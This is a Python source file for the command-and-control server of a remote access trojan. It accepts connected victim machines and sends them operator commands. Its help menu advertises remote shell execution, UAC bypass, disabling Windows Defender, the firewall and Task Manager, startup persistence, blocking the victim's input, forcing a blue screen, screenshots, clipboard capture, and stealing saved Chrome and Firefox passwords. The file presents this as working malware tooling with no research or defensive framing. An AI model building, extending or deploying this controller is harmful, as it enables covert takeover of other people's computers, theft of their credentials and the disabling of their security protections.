import socket
import subprocess
import os
import platform
import ctypes
import psutil
import webbrowser
import datetime
import shutil
import sys
import requests
import json
import pyautogui
import win32gui

class Client:
    def __init__(self, socket, address):
        self.socket = socket
        self.address = address
        self.username = None
        self.pc_name = None
        self.connection_time = datetime.datetime.now()

    def get_info(self):
        return f"{self.username} | {self.pc_name} | {self.connection_time}"

def receive_data(client_socket):
    data = client_socket.recv(1024).decode('utf-8')
    return data

def send_data(client_socket, data):
    client_socket.send(data.encode('utf-8'))

def get_system_info():
    system_info = platform.uname()
    return f"System: {system_info.system}\nNode Name: {system_info.node}\nRelease: {system_info.release}\nVersion: {system_info.version}\nMachine: {system_info.machine}\nProcessor: {system_info.processor}"

def command_loop(clients):
    selected_client = clients[0] if clients else None

    while True:
        command = input("Enter a command: ")

        if command == 'exit':
            send_data(selected_client.socket, command)
            break

        if command.startswith('sel'):
            parts = command.split(' ')
            if len(parts) == 2:
                client_id = int(parts[1])
                if client_id > 0 and client_id <= len(clients):
                    selected_client = clients[client_id - 1]
                    print(f"Selected client: {selected_client.get_info()}")
                else:
                    print("Invalid client ID")
                continue

        send_data(selected_client.socket, command)

        if command == 'exit':
            break

        elif command == 'help':
                print("Available commands:")
                print("message <message> - Displays a message box with the specified message.")
                print("shell <command> - Executes a shell command and returns the output.")
                print("admincheck - Checks if the client has admin privileges.")
                print("cd <directory> - Changes the current working directory.")
                print("dir - Lists files and directories in the current directory.")
                print("download <file_path> - Downloads a file from the server.")
                print("upload <file_name> - Uploads a file to the server.")
                print("uploadlink <link> <file_name> - Downloads a file from the specified link and uploads it to the server.")
                print("delete <file_path> - Deletes a file from the server.")
                print("write <sentence> - Writes the specified sentence using the keyboard.")
                print("wallpaper <wallpaper_path> - Changes the wallpaper to the specified image file.")
                print("clipboard - Retrieves the content of the clipboard.")
                print("idletime - Retrieves the time since the last user input.")
                print("currentdir - Retrieves the current working directory.")
                print("block - Blocks the keyboard and mouse input.")
                print("unblock - Unblocks the keyboard and mouse input.")
                print("screenshot - Takes a screenshot and sends it to the server.")
                print("kill <session_id> - Kills a specific process or all processes.")
                print("uacbypass - Attempts to bypass the User Account Control (UAC).")
                print("shutdown - Shuts down the client system.")
                print("restart - Restarts the client system.")
                print("logoff - Logs off the current user.")
                print("bluescreen - Triggers a blue screen error on the client system.")
                print("datetime - Retrieves the current date and time.")
                print("prockill <process_name> - Kills a process with the specified name.")
                print("disabledefender - Disables Windows Defender.")
                print("disablefirewall - Disables the Windows Firewall.")
                print("critproc - Sets the current process as critical.")
                print("uncritproc - Sets the current process as non-critical.")
                print("website <website_url> - Opens the specified website in the default web browser.")
                print("disabletaskmgr - Disables the Windows Task Manager.")
                print("enabletaskmgr - Enables the Windows Task Manager.")
                print("startup - Adds the current script to the startup folder.")
                print("geolocate - Retrieves geolocation information and opens it on Google Maps.")
                print("listprocess - Lists all running processes.")
                print("password - Retrieves saved passwords from Google Chrome and Mozilla Firefox.")

        response = receive_data(selected_client.socket)
        print(response)

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('127.0.0.1', 12345))
    server_socket.listen(5)
    print("[+] Server started. Listening for connections...")

    clients = []

    while True:
        client_socket, address = server_socket.accept()
        print(f"[+] Connection established with {address}")

        new_client = Client(client_socket, address)
        clients.append(new_client)

        client_id = len(clients)
        print(f"[+] Client ID: {client_id}")
        print(f"[+] Total clients connected: {len(clients)}")

        command_loop(clients)

        clients.remove(new_client)
        client_socket.close()

if __name__ == '__main__':
    main()
